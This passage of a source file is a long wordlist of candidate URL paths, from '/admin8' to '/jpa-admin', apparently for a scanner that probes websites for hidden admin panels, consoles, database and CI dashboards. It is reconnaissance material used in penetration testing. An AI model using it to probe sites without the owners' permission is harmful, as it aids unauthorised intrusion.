    "/admin8", "/admin9", "/admin0", "/admin00", "/admin01",
    "/admin10", "/admin11", "/admin20", "/admin30", "/admin40",
    "/admin50", "/admin100", "/admin200",
    "/control", "/control/", "/control.php", "/control/login.php",
    "/controlpanel/login.php", "/controlpanel/index.php",
    "/backend/login", "/backend/login.php", "/backend/index.php",
    "/backend/admin", "/backend/control",
    "/moderator/control", "/moderator/manage",
    "/mod", "/mod/", "/mods", "/mods/",
    "/secret", "/secret/", "/secrets", "/secrets/",
    "/hidden/admin", "/hidden/panel", "/hidden/control",
    "/private/admin", "/private/panel", "/private/control",
    "/secure/panel", "/secure/control", "/secure/admin",
    "/protected", "/protected/", "/protected/admin", "/protected/login",
    "/restricted", "/restricted/", "/restricted/admin",
    "/lockdown", "/lockdown/", "/lockdown/admin",
    "/gateway", "/gateway/", "/gateway/admin",
    "/access", "/access/", "/access/admin", "/access/panel",
    "/enter", "/enter/", "/enter.php", "/entry", "/entry/",
    "/door", "/door/", "/keymaster", "/keymaster/",
    "/unlock", "/unlock/", "/unlocked", "/unlocked/",
    "/vault", "/vault/", "/vault/admin",
    "/stronghold", "/stronghold/",
    "/fortress", "/citadel", "/bastion",
    "/command-center", "/commandcenter", "/command_center",
    "/ops", "/ops/", "/operations", "/operations/",
    "/mission", "/mission/", "/mission-control",
    "/hq", "/headquarters", "/hq/admin",
    "/zone", "/zone/admin", "/zone/control",
    "/sector", "/sector/admin",
    "/nucleus", "/nucleus/", "/nucleus/admin",
    "/core", "/core/", "/core/admin", "/core/config",
    "/core/panel", "/core/system",
    "/kernel", "/kernel/", "/kernel/admin",
    "/matrix", "/matrix/", "/matrix/admin",
    "/nexus", "/nexus/", "/nexus/admin",
    "/apex", "/apex/", "/apex/admin",
    "/prime", "/prime/", "/prime/admin",
    "/alpha", "/alpha/", "/alpha/admin",
    "/omega", "/omega/", "/omega/admin",
    "/zeus", "/zeus/", "/zeus/admin",
    "/hermes", "/hermes/",
    "/atlas", "/atlas/admin",
    "/titan", "/titan/",
    "/kronos", "/kronos/admin",
    "/poseidon", "/poseidon/",
    "/oracle", "/oracle/", "/oracle/admin",
    "/sap", "/sap/", "/sap/admin",
    "/erp", "/erp/", "/erp/admin", "/erp/login",
    "/crm", "/crm/login", "/crm/admin",
    "/hrm", "/hrm/login", "/hrm/admin",
    "/lms", "/lms/", "/lms/admin",
    "/cms", "/cms/admin", "/cms/control",
    "/ems", "/ems/", "/ems/admin",
    "/wms", "/wms/", "/wms/admin",
    "/pms", "/pms/", "/pms/admin",
    "/oms", "/oms/", "/oms/admin",
    "/ims", "/ims/", "/ims/admin",
    "/rms", "/rms/", "/rms/admin",
    "/dms", "/dms/", "/dms/admin",
    "/bms", "/bms/", "/bms/admin",
    "/fms", "/fms/", "/fms/admin",
    "/hms", "/hms/", "/hms/admin",
    "/kms", "/kms/", "/kms/admin",
    "/tms", "/tms/", "/tms/admin",
    "/nms", "/nms/", "/nms/admin",
    "/qms", "/qms/", "/qms/admin",
    "/gms", "/gms/", "/gms/admin",
    "/jms", "/jms/",
    "/crs", "/crs/admin",
    "/pos", "/pos/", "/pos/admin",
    "/shop-admin", "/shop-admin/", "/store-admin", "/store-admin/",
    "/ecommerce/admin", "/ecommerce/panel",
    "/shopping", "/shopping/admin",
    "/cart", "/cart/admin",
    "/checkout", "/checkout/admin",
    "/inventory", "/inventory/admin",
    "/warehouse", "/warehouse/admin",
    "/stock", "/stock/admin",
    "/catalog", "/catalog/admin",
    "/product", "/product/admin",
    "/products", "/products/admin",
    "/product-admin", "/product-admin/",
    "/order", "/order/admin",
    "/orders", "/orders/admin",
    "/order-admin", "/order-admin/",
    "/invoice", "/invoice/admin",
    "/invoices", "/invoices/admin",
    "/billing", "/billing/admin",
    "/payment", "/payment/admin",
    "/payments", "/payments/admin",
    "/subscription", "/subscription/admin",
    "/subscriptions", "/subscriptions/admin",
    "/customer", "/customer/admin",
    "/customers", "/customers/admin",
    "/client", "/client/admin",
    "/clients", "/clients/admin",
    "/user-admin", "/user-admin/",
    "/users-admin", "/users-admin/",
    "/manage-users", "/manage-users/",
    "/user-management", "/user-management/",
    "/account-admin", "/account-admin/",
    "/accounts-admin", "/accounts-admin/",
    "/profile-admin", "/profile-admin/",
    "/member-admin", "/member-admin/",
    "/members-admin", "/members-admin/",
    "/staff", "/staff/", "/staff/admin",
    "/team", "/team/", "/team/admin",
    "/employee", "/employee/admin",
    "/employees", "/employees/admin",
    "/hr", "/hr/", "/hr/admin",
    "/payroll", "/payroll/",
    "/finance", "/finance/admin",
    "/accounting", "/accounting/admin",
    "/reports", "/reports/admin",
    "/reporting", "/reporting/admin",
    "/analytics", "/analytics/admin",
    "/statistics", "/statistics/admin",
    "/stats", "/stats/admin",
    "/metrics", "/metrics/admin",
    "/kpi", "/kpi/admin",
    "/dashboard/admin", "/dashboard/panel",
    "/dashboard/control", "/dashboard/manage",
    "/dashboard/settings", "/dashboard/config",
    "/dashboards", "/dashboards/admin",
    "/widget", "/widget/admin",
    "/widgets", "/widgets/admin",
    "/plugin", "/plugin/admin",
    "/plugins", "/plugins/admin",
    "/extension", "/extension/admin",
    "/extensions", "/extensions/admin",
    "/addon", "/addon/admin",
    "/addons", "/addons/admin",
    "/module", "/module/admin",
    "/modules", "/modules/admin",
    "/component", "/component/admin",
    "/components", "/components/admin",
    "/template", "/template/admin",
    "/templates", "/templates/admin",
    "/theme", "/theme/admin",
    "/themes", "/themes/admin",
    "/skin", "/skin/admin",
    "/skins", "/skins/admin",
    "/layout", "/layout/admin",
    "/layouts", "/layouts/admin",
    "/page", "/page/admin",
    "/pages", "/pages/admin",
    "/post", "/post/admin",
    "/posts", "/posts/admin",
    "/article", "/article/admin",
    "/articles", "/articles/admin",
    "/news", "/news/admin",
    "/blog", "/blog/admin",
    "/category", "/category/admin",
    "/categories", "/categories/admin",
    "/tag", "/tag/admin",
    "/tags", "/tags/admin",
    "/menu", "/menu/admin",
    "/menus", "/menus/admin",
    "/navigation", "/navigation/admin",
    "/nav", "/nav/admin",
    "/sidebar", "/sidebar/admin",
    "/footer", "/footer/admin",
    "/header", "/header/admin",
    "/widget-admin", "/widget-admin/",
    "/media", "/media/admin",
    "/image", "/image/admin",
    "/images", "/images/admin",
    "/photo", "/photo/admin",
    "/photos", "/photos/admin",
    "/gallery", "/gallery/admin",
    "/galleries", "/galleries/admin",
    "/video", "/video/admin",
    "/videos", "/videos/admin",
    "/audio", "/audio/admin",
    "/file", "/file/admin",
    "/files", "/files/admin",
    "/document", "/document/admin",
    "/documents", "/documents/admin",
    "/download", "/download/admin",
    "/downloads", "/downloads/admin",
    "/upload", "/upload/admin",
    "/uploads", "/uploads/admin",
    "/import", "/import/admin",
    "/export", "/export/admin",
    "/backup", "/backup/admin",
    "/backups", "/backups/admin",
    "/restore", "/restore/admin",
    "/migrate", "/migrate/admin",
    "/migration", "/migration/admin",
    "/transfer", "/transfer/admin",
    "/sync", "/sync/admin",
    "/synchronize", "/synchronize/admin",
    "/scheduler", "/scheduler/admin",
    "/task", "/task/admin",
    "/tasks", "/tasks/admin",
    "/job", "/job/admin",
    "/jobs", "/jobs/admin",
    "/queue", "/queue/admin",
    "/queues", "/queues/admin",
    "/worker", "/worker/admin",
    "/workers", "/workers/admin",
    "/cron", "/cron/admin",
    "/cronjob", "/cronjob/admin",
    "/cronjobs", "/cronjobs/admin",
    "/hook", "/hook/admin",
    "/hooks", "/hooks/admin",
    "/webhook", "/webhook/admin",
    "/webhooks", "/webhooks/admin",
    "/callback", "/callback/admin",
    "/callbacks", "/callbacks/admin",
    "/listener", "/listener/admin",
    "/listeners", "/listeners/admin",
    "/event", "/event/admin",
    "/events", "/events/admin",
    "/log", "/log/admin",
    "/logs", "/logs/admin",
    "/logging", "/logging/admin",
    "/audit", "/audit/admin",
    "/auditlog", "/auditlog/admin",
    "/activity", "/activity/admin",
    "/activitylog", "/activitylog/admin",
    "/history", "/history/admin",
    "/changelog", "/changelog/admin",
    "/notification", "/notification/admin",
    "/notifications", "/notifications/admin",
    "/alert", "/alert/admin",
    "/alerts", "/alerts/admin",
    "/message", "/message/admin",
    "/messages", "/messages/admin",
    "/inbox", "/inbox/admin",
    "/outbox", "/outbox/admin",
    "/sent", "/sent/admin",
    "/draft", "/draft/admin",
    "/drafts", "/drafts/admin",
    "/trash", "/trash/admin",
    "/spam", "/spam/admin",
    "/email", "/email/admin",
    "/emails", "/emails/admin",
    "/mail", "/mail/admin",
    "/mailing", "/mailing/admin",
    "/newsletter", "/newsletter/admin",
    "/newsletters", "/newsletters/admin",
    "/subscriber", "/subscriber/admin",
    "/subscribers", "/subscribers/admin",
    "/list", "/list/admin",
    "/lists", "/lists/admin",
    "/campaign", "/campaign/admin",
    "/campaigns", "/campaigns/admin",
    "/template-admin", "/template-admin/",
    "/form", "/form/admin",
    "/forms", "/forms/admin",
    "/survey", "/survey/admin",
    "/surveys", "/surveys/admin",
    "/quiz", "/quiz/admin",
    "/quizzes", "/quizzes/admin",
    "/poll", "/poll/admin",
    "/polls", "/polls/admin",
    "/vote", "/vote/admin",
    "/votes", "/votes/admin",
    "/rating", "/rating/admin",
    "/ratings", "/ratings/admin",
    "/review", "/review/admin",
    "/reviews", "/reviews/admin",
    "/comment", "/comment/admin",
    "/comments", "/comments/admin",
    "/feedback", "/feedback/admin",
    "/ticket", "/ticket/admin",
    "/tickets", "/tickets/admin",
    "/support", "/support/admin",
    "/helpdesk", "/helpdesk/admin",
    "/faq", "/faq/admin",
    "/faqs", "/faqs/admin",
    "/knowledge", "/knowledge/admin",
    "/knowledgebase", "/knowledgebase/admin",
    "/kb", "/kb/admin",
    "/wiki", "/wiki/admin",
    "/doc", "/doc/admin",
    "/docs", "/docs/admin",
    "/documentation", "/documentation/admin",
    "/manual", "/manual/admin",
    "/guide", "/guide/admin",
    "/tutorial", "/tutorial/admin",
    "/tutorials", "/tutorials/admin",
    "/lesson", "/lesson/admin",
    "/lessons", "/lessons/admin",
    "/course", "/course/admin",
    "/courses", "/courses/admin",
    "/training", "/training/admin",
    "/certification", "/certification/admin",
    "/certificate", "/certificate/admin",
    "/certificates", "/certificates/admin",
    "/diploma", "/diploma/admin",
    "/award", "/award/admin",
    "/awards", "/awards/admin",
    "/badge", "/badge/admin",
    "/badges", "/badges/admin",
    "/point", "/point/admin",
    "/points", "/points/admin",
    "/reward", "/reward/admin",
    "/rewards", "/rewards/admin",
    "/coupon", "/coupon/admin",
    "/coupons", "/coupons/admin",
    "/promo", "/promo/admin",
    "/promos", "/promos/admin",
    "/promotion", "/promotion/admin",
    "/promotions", "/promotions/admin",
    "/discount", "/discount/admin",
    "/discounts", "/discounts/admin",
    "/voucher", "/voucher/admin",
    "/vouchers", "/vouchers/admin",
    "/gift", "/gift/admin",
    "/gifts", "/gifts/admin",
    "/affiliate", "/affiliate/admin",
    "/affiliates", "/affiliates/admin",
    "/referral", "/referral/admin",
    "/referrals", "/referrals/admin",
    "/partner", "/partner/admin",
    "/partners", "/partners/admin",
    "/vendor", "/vendor/admin",
    "/vendors", "/vendors/admin",
    "/supplier", "/supplier/admin",
    "/suppliers", "/suppliers/admin",
    "/reseller", "/reseller/admin",
    "/resellers", "/resellers/admin",
    "/distributor", "/distributor/admin",
    "/distributors", "/distributors/admin",
    "/agent", "/agent/admin",
    "/agents", "/agents/admin",
    "/broker", "/broker/admin",
    "/brokers", "/broker/admin",
    "/dealer", "/dealer/admin",
    "/dealers", "/dealers/admin",
    "/wholesale", "/wholesale/admin",
    "/retail", "/retail/admin",
    "/franchise", "/franchise/admin",
    "/franchises", "/franchises/admin",
    "/location", "/location/admin",
    "/locations", "/locations/admin",
    "/store", "/store/admin",
    "/stores", "/stores/admin",
    "/branch", "/branch/admin",
    "/branches", "/branches/admin",
    "/department", "/department/admin",
    "/departments", "/departments/admin",
    "/division", "/division/admin",
    "/divisions", "/divisions/admin",
    "/unit", "/unit/admin",
    "/units", "/units/admin",
    "/team", "/team/admin",
    "/teams", "/teams/admin",
    "/group", "/group/admin",
    "/groups", "/groups/admin",
    "/role", "/role/admin",
    "/roles", "/roles/admin",
    "/permission", "/permission/admin",
    "/permissions", "/permissions/admin",
    "/privilege", "/privilege/admin",
    "/privileges", "/privileges/admin",
    "/capability", "/capability/admin",
    "/capabilities", "/capabilities/admin",
    "/access-control", "/access-control/",
    "/acl", "/acl/admin",
    "/policy", "/policy/admin",
    "/policies", "/policies/admin",
    "/rule", "/rule/admin",
    "/rules", "/rules/admin",
    "/filter", "/filter/admin",
    "/filters", "/filters/admin",
    "/block", "/block/admin",
    "/blocks", "/blocks/admin",
    "/blocklist", "/blocklist/admin",
    "/blacklist", "/blacklist/admin",
    "/whitelist", "/whitelist/admin",
    "/allowlist", "/allowlist/admin",
    "/ban", "/ban/admin",
    "/bans", "/bans/admin",
    "/banned", "/banned/admin",
    "/suspend", "/suspend/admin",
    "/suspended", "/suspended/admin",
    "/deactivate", "/deactivate/admin",
    "/deactivated", "/deactivated/admin",
    "/delete", "/delete/admin",
    "/deleted", "/deleted/admin",
    "/trash", "/trash/admin",
    "/recycle", "/recycle/admin",
    "/recovery", "/recovery/admin",
    "/recover", "/recover/admin",
    "/reset", "/reset/admin",
    "/restore", "/restore/admin",
    "/maintenance/admin", "/maintenance/panel",
    "/maintenance/control",
    "/offline", "/offline/admin",
    "/downtime", "/downtime/admin",
    "/status/admin", "/health/admin",
    "/monitor", "/monitor/admin",
    "/monitoring", "/monitoring/admin",
    "/probe", "/probe/admin",
    "/check", "/check/admin",
    "/test", "/test/admin",
    "/testing", "/testing/admin",
    "/sandbox/admin", "/sandbox/panel",
    "/staging/admin", "/staging/panel",
    "/development/admin", "/development/panel",
    "/preview/admin", "/preview/panel",
    "/draft/admin",
    "/review/panel",
    "/approval", "/approval/admin",
    "/approve", "/approve/admin",
    "/reject", "/reject/admin",
    "/moderate", "/moderate/admin",
    "/moderation", "/moderation/admin",
    "/report", "/report/admin",
    "/reports", "/reports/admin",
    "/complaint", "/complaint/admin",
    "/complaints", "/complaints/admin",
    "/escalation", "/escalation/admin",
    "/escalate", "/escalate/admin",
    "/issue", "/issue/admin",
    "/issues", "/issues/admin",
    "/bug", "/bug/admin",
    "/bugs", "/bugs/admin",
    "/error", "/error/admin",
    "/errors", "/errors/admin",
    "/exception", "/exception/admin",
    "/exceptions", "/exceptions/admin",
    "/trace", "/trace/admin",
    "/traceback", "/traceback/admin",
    "/core-dump", "/core-dump/",
    "/coredump", "/coredump/",
    "/crash", "/crash/admin",
    "/crashes", "/crashes/admin",
    "/diagnostic", "/diagnostic/admin",
    "/diagnostics", "/diagnostics/admin",
    "/health-check", "/health-check/",
    "/healthcheck", "/healthcheck/admin",
    "/liveness", "/liveness/",
    "/readiness", "/readiness/",
    "/alive", "/alive/",
    "/ready", "/ready/",
    "/version", "/version/admin",
    "/versions", "/versions/admin",
    "/release", "/release/admin",
    "/releases", "/releases/admin",
    "/changelog", "/changelog/admin",
    "/deploy", "/deploy/admin",
    "/deployment", "/deployment/admin",
    "/deployments", "/deployments/admin",
    "/rollout", "/rollout/admin",
    "/rollback", "/rollback/admin",
    "/canary", "/canary/admin",
    "/feature", "/feature/admin",
    "/features", "/features/admin",
    "/flag", "/flag/admin",
    "/flags", "/flags/admin",
    "/toggle", "/toggle/admin",
    "/toggles", "/toggles/admin",
    "/experiment", "/experiment/admin",
    "/experiments", "/experiments/admin",
    "/ab-test", "/ab-test/admin",
    "/abtest", "/abtest/admin",
    "/variation", "/variation/admin",
    "/variations", "/variations/admin",
    "/segment", "/segment/admin",
    "/segments", "/segments/admin",
    "/cohort", "/cohort/admin",
    "/cohorts", "/cohorts/admin",
    "/audience", "/audience/admin",
    "/audiences", "/audiences/admin",
    "/geo", "/geo/admin",
    "/geoblock", "/geoblock/admin",
    "/ipblock", "/ipblock/admin",
    "/ipban", "/ipban/admin",
    "/ratelimit", "/ratelimit/admin",
    "/throttle", "/throttle/admin",
    "/quota", "/quota/admin",
    "/quotas", "/quotas/admin",
    "/usage", "/usage/admin",
    "/limit", "/limit/admin",
    "/limits", "/limits/admin",
    "/token", "/token/admin",
    "/tokens", "/tokens/admin",
    "/apikey", "/apikey/admin",
    "/apikeys", "/apikeys/admin",
    "/secret-key", "/secret-key/admin",
    "/oauth", "/oauth/admin",
    "/oauth2", "/oauth2/admin",
    "/openid", "/openid/admin",
    "/sso", "/sso/admin",
    "/saml", "/saml/admin",
    "/ldap", "/ldap/admin",
    "/radius", "/radius/admin",
    "/auth0", "/auth0/admin",
    "/okta", "/okta/admin",
    "/cognito", "/cognito/admin",
    "/ping", "/ping/admin",
    "/connect", "/connect/admin",
    "/connections", "/connections/admin",
    "/integration", "/integration/admin",
    "/integrations", "/integrations/admin",
    "/connector", "/connector/admin",
    "/connectors", "/connectors/admin",
    "/bridge", "/bridge/admin",
    "/gateway", "/gateway/admin",
    "/proxy", "/proxy/admin",
    "/tunnel", "/tunnel/admin",
    "/vpn", "/vpn/admin",
    "/cdn", "/cdn/admin",
    "/cache", "/cache/admin",
    "/flush", "/flush/admin",
    "/purge", "/purge/admin",
    "/clear", "/clear/admin",
    "/invalidate", "/invalidate/admin",
    "/invalidation", "/invalidation/admin",
    "/index", "/index/admin",
    "/reindex", "/reindex/admin",
    "/search", "/search/admin",
    "/elasticsearch", "/elasticsearch/admin",
    "/solr", "/solr/admin",
    "/whoami", "/whoami/",
    "/id", "/id/",
    "/env", "/env/",
    "/environment", "/environment/",
    "/vars", "/vars/",
    "/variables", "/variables/",
    "/param", "/param/",
    "/params", "/params/",
    "/config-admin", "/config-admin/",
    "/configs", "/configs/admin",
    "/setting", "/setting/admin",
    "/settings", "/settings/admin",
    "/preference", "/preference/admin",
    "/preferences", "/preferences/admin",
    "/option", "/option/admin",
    "/options", "/options/admin",
    "/parameter", "/parameter/admin",
    "/parameters", "/parameters/admin",
    "/property", "/property/admin",
    "/properties", "/properties/admin",
    "/metadata", "/metadata/admin",
    "/meta", "/meta/admin",
    "/info-admin", "/info-admin/",
    "/about-admin", "/about-admin/",
    "/sys", "/sys/",
    "/sysinfo", "/sysinfo/",
    "/system-info", "/system-info/",
    "/system-status", "/system-status/",
    "/sys-admin", "/sys-admin/",
    "/sysadmin2", "/sysadmin3",
    "/net", "/net/admin",
    "/network", "/network/admin",
    "/networks", "/networks/admin",
    "/firewall", "/firewall/admin",
    "/waf", "/waf/admin",
    "/ids", "/ids/admin",
    "/ips", "/ips/admin",
    "/siem", "/siem/admin",
    "/sox", "/sox/",
    "/pci", "/pci/",
    "/hipaa", "/hipaa/",
    "/gdpr", "/gdpr/admin",
    "/compliance", "/compliance/admin",
    "/audit-trail", "/audit-trail/",
    "/security-admin", "/security-admin/",
    "/infosec", "/infosec/",
    "/cyber", "/cyber/admin",
    "/soc", "/soc/",
    "/noc", "/noc/",
    "/datacenter", "/datacenter/admin",
    "/data-center", "/data-center/admin",
    "/cloud", "/cloud/admin",
    "/aws", "/aws/admin",
    "/azure", "/azure/admin",
    "/gcp", "/gcp/admin",
    "/storage", "/storage/admin",
    "/bucket", "/bucket/admin",
    "/blob", "/blob/admin",
    "/s3", "/s3/",
    "/object-storage", "/object-storage/admin",
    "/cluster", "/cluster/admin",
    "/clusters", "/clusters/admin",
    "/node", "/node/admin",
    "/nodes", "/nodes/admin",
    "/pod", "/pod/admin",
    "/pods", "/pods/admin",
    "/service", "/service/admin",
    "/services", "/services/admin",
    "/ingress", "/ingress/admin",
    "/egress", "/egress/admin",
    "/namespace", "/namespace/admin",
    "/namespaces", "/namespaces/admin",
    "/kubectl", "/kubectl/",
    "/helm", "/helm/admin",
    "/chart", "/chart/admin",
    "/charts", "/charts/admin",
    "/registry", "/registry/admin",
    "/image", "/image/admin",
    "/container", "/container/admin",
    "/containers", "/containers/admin",
    "/vm", "/vm/admin",
    "/virtual", "/virtual/admin",
    "/hypervisor", "/hypervisor/admin",
    "/compute", "/compute/admin",
    "/instance", "/instance/admin",
    "/instances", "/instances/admin",
    "/server", "/server/admin",
    "/servers", "/servers/admin",
    "/host", "/host/admin",
    "/hosts", "/hosts/admin",
    "/machine", "/machine/admin",
    "/machines", "/machines/admin",
    "/rack", "/rack/admin",
    "/switch", "/switch/admin",
    "/router", "/router/admin",
    "/load-balancer", "/load-balancer/admin",
    "/lb", "/lb/admin",
    "/cdn-admin", "/cdn-admin/",
    "/reverse-proxy", "/reverse-proxy/admin",
    "/nginx-admin", "/nginx-admin/",
    "/apache-admin", "/apache-admin/",
    "/iis-admin", "/iis-admin/",
    "/tomcat-admin", "/tomcat-admin/",
    "/jetty-admin", "/jetty-admin/",
    "/weblogic-admin", "/weblogic-admin/",
    "/jboss-admin", "/jboss-admin/",
    "/glassfish-admin", "/glassfish-admin/",
    "/wildfly-admin", "/wildfly-admin/",
    "/db", "/db/", "/db/admin",
    "/database", "/database/admin",
    "/mysql-admin", "/mysql-admin/",
    "/postgres-admin", "/postgres-admin/",
    "/mssql-admin", "/mssql-admin/",
    "/oracle-admin", "/oracle-admin/",
    "/redis-admin", "/redis-admin/",
    "/mongo-admin", "/mongo-admin/",
    "/mongodb-admin", "/mongodb-admin/",
    "/cassandra-admin", "/cassandra-admin/",
    "/elasticsearch-admin", "/elasticsearch-admin/",
    "/neo4j-admin", "/neo4j-admin/",
    "/influxdb-admin", "/influxdb-admin/",
    "/timescale-admin", "/timescale-admin/",
    "/clickhouse-admin", "/clickhouse-admin/",
    "/snowflake-admin", "/snowflake-admin/",
    "/bigquery-admin", "/bigquery-admin/",
    "/redshift-admin", "/redshift-admin/",
    "/backup-admin", "/backup-admin/",
    "/backupadmin", "/backupadmin/",
    "/dr", "/dr/", "/disaster-recovery",
    "/ha", "/ha/admin",
    "/failover", "/failover/admin",
    "/replication", "/replication/admin",
    "/replica", "/replica/admin",
    "/primary", "/primary/admin",
    "/secondary", "/secondary/admin",
    "/master", "/master/admin",
    "/slave", "/slave/admin",
    "/mirror", "/mirror/admin",
    "/snapshot", "/snapshot/admin",
    "/snapshots", "/snapshots/admin",
    "/clone", "/clone/admin",
    "/clones", "/clones/admin",
    "/volume", "/volume/admin",
    "/volumes", "/volumes/admin",
    "/disk", "/disk/admin",
    "/disks", "/disks/admin",
    "/partition", "/partition/admin",
    "/partitions", "/partitions/admin",
    "/mount", "/mount/admin",
    "/mounts", "/mounts/admin",
    "/share", "/share/admin",
    "/shares", "/shares/admin",
    "/nas", "/nas/admin",
    "/san", "/san/admin",
    "/nfs", "/nfs/admin",
    "/smb", "/smb/admin",
    "/ftp", "/ftp/admin",
    "/sftp", "/sftp/admin",
    "/ftps", "/ftps/admin",
    "/scp", "/scp/admin",
    "/rsync", "/rsync/admin",
    "/minio-admin", "/minio-admin/",
    "/portainer-admin", "/portainer-admin/",
    "/rancher-admin", "/rancher-admin/",
    "/k8s-admin", "/k8s-admin/",
    "/kubernetes-admin", "/kubernetes-admin/",
    "/argo", "/argo/admin",
    "/flux", "/flux/admin",
    "/spinnaker", "/spinnaker/admin",
    "/tekton", "/tekton/admin",
    "/jenkins-admin", "/jenkins-admin/",
    "/gitlab-admin", "/gitlab-admin/",
    "/github-admin", "/github-admin/",
    "/bitbucket-admin", "/bitbucket-admin/",
    "/jira-admin", "/jira-admin/",
    "/confluence-admin", "/confluence-admin/",
    "/nexus-admin", "/nexus-admin/",
    "/artifactory-admin", "/artifactory-admin/",
    "/sonar-admin", "/sonar-admin/",
    "/bamboo-admin", "/bamboo-admin/",
    "/travis-admin", "/travis-admin/",
    "/circle-admin", "/circle-admin/",
    "/teamcity-admin", "/teamcity-admin/",
    "/grafana-admin", "/grafana-admin/",
    "/kibana-admin", "/kibana-admin/",
    "/prometheus-admin", "/prometheus-admin/",
    "/alertmanager-admin", "/alertmanager-admin/",
    "/zabbix", "/zabbix/admin",
    "/nagios", "/nagios/admin",
    "/icinga", "/icinga/admin",
    "/cacti", "/cacti/admin",
    "/netdata", "/netdata/admin",
    "/datadog-admin", "/datadog-admin/",
    "/newrelic-admin", "/newrelic-admin/",
    "/pagerduty-admin", "/pagerduty-admin/",
    "/opsgenie-admin", "/opsgenie-admin/",
    "/victorops-admin", "/victorops-admin/",
    "/splunk", "/splunk/admin",
    "/logstash-admin", "/logstash-admin/",
    "/fluentd-admin", "/fluentd-admin/",
    "/graylog", "/graylog/admin",
    "/papertrail-admin", "/papertrail-admin/",
    "/loggly-admin", "/loggly-admin/",
    "/sumologic-admin", "/sumologic-admin/",
    "/cloudwatch-admin", "/cloudwatch-admin/",
    "/sentry", "/sentry/admin",
    "/rollbar-admin", "/rollbar-admin/",
    "/bugsnag-admin", "/bugsnag-admin/",
    "/raygun-admin", "/raygun-admin/",
    "/appoptics-admin", "/appoptics-admin/",
    "/appdynamics-admin", "/appdynamics-admin/",
    "/dynatrace-admin", "/dynatrace-admin/",
    "/instana-admin", "/instana-admin/",
    "/lightstep-admin", "/lightstep-admin/",
    "/honeycomb-admin", "/honeycomb-admin/",
    "/terraform-admin", "/terraform-admin/",
    "/ansible-admin", "/ansible-admin/",
    "/puppet-admin", "/puppet-admin/",
    "/chef-admin", "/chef-admin/",
    "/saltstack-admin", "/saltstack-admin/",
    "/vault-admin", "/vault-admin/",
    "/consul-admin", "/consul-admin/",
    "/nomad-admin", "/nomad-admin/",
    "/packer-admin", "/packer-admin/",
    "/vagrant-admin", "/vagrant-admin/",
    "/aws-console", "/aws-console/",
    "/azure-portal", "/azure-portal/",
    "/gcp-console", "/gcp-console/",
    "/heroku-admin", "/heroku-admin/",
    "/digitalocean-admin", "/digitalocean-admin/",
    "/linode-admin", "/linode-admin/",
    "/vultr-admin", "/vultr-admin/",
    "/hetzner-admin", "/hetzner-admin/",
    "/ovh-admin", "/ovh-admin/",
    "/cloudflare-admin", "/cloudflare-admin/",
    "/fastly-admin", "/fastly-admin/",
    "/akamai-admin", "/akamai-admin/",
    "/maxcdn-admin", "/maxcdn-admin/",
    "/keycdn-admin", "/keycdn-admin/",
    "/bunnycdn-admin", "/bunnycdn-admin/",
    "/shopify-admin", "/shopify-admin/",
    "/magento-admin", "/magento-admin/",
    "/woocommerce-admin", "/woocommerce-admin/",
    "/opencart-admin", "/opencart-admin/",
    "/prestashop-admin", "/prestashop-admin/",
    "/bigcommerce-admin", "/bigcommerce-admin/",
    "/volusion-admin", "/volusion-admin/",
    "/3dcart-admin", "/3dcart-admin/",
    "/squarespace-admin", "/squarespace-admin/",
    "/wix-admin", "/wix-admin/",
    "/weebly-admin", "/weebly-admin/",
    "/drupal-admin", "/drupal-admin/",
    "/joomla-admin", "/joomla-admin/",
    "/typo3", "/typo3/admin",
    "/typo3/typo3", "/typo3/backend",
    "/craft", "/craft/admin",
    "/craft-admin", "/craft-admin/",
    "/expressionengine", "/expressionengine/admin",
    "/ee-admin", "/ee-admin/",
    "/modx", "/modx/admin",
    "/silverstripe", "/silverstripe/admin",
    "/perch", "/perch/admin",
    "/concrete5", "/concrete5/admin",
    "/concrete", "/concrete/admin",
    "/grav", "/grav/admin",
    "/statamic", "/statamic/admin",
    "/kirby", "/kirby/admin",
    "/textpattern", "/textpattern/admin",
    "/serendipity", "/serendipity/admin",
    "/nucleus", "/nucleus/admin",
    "/b2evolution", "/b2evolution/admin",
    "/dotclear", "/dotclear/admin",
    "/pivot", "/pivot/admin",
    "/lifetype", "/lifetype/admin",
    "/pivot-x", "/pivot-x/admin",
    "/movabletype", "/movabletype/admin",
    "/movable-type", "/movable-type/admin",
    "/blogger-admin", "/blogger-admin/",
    "/ghost", "/ghost/admin",
    "/ghost-admin", "/ghost-admin/",
    "/strapi", "/strapi/admin",
    "/payload", "/payload/admin",
    "/directus", "/directus/admin",
    "/contentful-admin", "/contentful-admin/",
    "/sanity-admin", "/sanity-admin/",
    "/prismic-admin", "/prismic-admin/",
    "/forestry-admin", "/forestry-admin/",
    "/netlify-cms", "/netlify-cms/admin",
    "/decap-cms", "/decap-cms/admin",
    "/tina-admin", "/tina-admin/",
    "/cloudcannon-admin", "/cloudcannon-admin/",
    "/keystonejs", "/keystonejs/admin",
    "/keystone-admin", "/keystone-admin/",
    "/apos", "/apos/admin",
    "/apostrophe-admin", "/apostrophe-admin/",
    "/wagtail", "/wagtail/admin",
    "/django-admin", "/django-admin/",
    "/flask-admin", "/flask-admin/",
    "/rails-admin", "/rails-admin/",
    "/laravel-admin", "/laravel-admin/",
    "/symfony-admin", "/symfony-admin/",
    "/codeigniter-admin", "/codeigniter-admin/",
    "/yii-admin", "/yii-admin/",
    "/cakephp-admin", "/cakephp-admin/",
    "/zend-admin", "/zend-admin/",
    "/spring-admin", "/spring-admin/",
    "/springboot-admin", "/springboot-admin/",
    "/grails-admin", "/grails-admin/",
    "/play-admin", "/play-admin/",
    "/express-admin", "/express-admin/",
    "/nest-admin", "/nest-admin/",
    "/fastapi-admin", "/fastapi-admin/",
    "/gin-admin", "/gin-admin/",
    "/echo-admin", "/echo-admin/",
    "/fiber-admin", "/fiber-admin/",
    "/fastify-admin", "/fastify-admin/",
    "/hapi-admin", "/hapi-admin/",
    "/koa-admin", "/koa-admin/",
    "/feathers-admin", "/feathers-admin/",
    "/loopback-admin", "/loopback-admin/",
    "/sails-admin", "/sails-admin/",
    "/meteor-admin", "/meteor-admin/",
    "/phoenix-admin", "/phoenix-admin/",
    "/sinatra-admin", "/sinatra-admin/",
    "/rails", "/rails/admin",
    "/rack", "/rack/admin",
    "/padrino", "/padrino/admin",
    "/hanami", "/hanami/admin",
    "/rom-admin", "/rom-admin/",
    "/sequel-admin", "/sequel-admin/",
    "/activerecord-admin", "/activerecord-admin/",
    "/ecto-admin", "/ecto-admin/",
    "/hibernate-admin", "/hibernate-admin/",
    "/mybatis-admin", "/mybatis-admin/",
    "/jpa-admin", "/jpa-admin/",
